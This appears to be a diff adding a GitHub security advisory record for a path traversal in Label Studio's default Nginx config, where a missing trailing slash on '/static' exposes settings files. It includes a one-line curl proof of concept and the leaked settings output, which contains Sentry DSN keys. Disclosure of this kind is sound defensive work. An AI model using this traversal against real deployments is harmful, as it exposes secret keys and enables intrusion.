@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-cpmr-mw4j-99r7",
+  "modified": "2023-03-24T22:04:02Z",
+  "published": "2023-03-24T22:04:02Z",
+  "aliases": [
+
+  ],
+  "summary": "Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/",
+  "details": "### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "label-studio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.7.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/heartexlabs/label-studio"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-24T22:04:02Z",
+    "nvd_published_at": null
+  }
+}
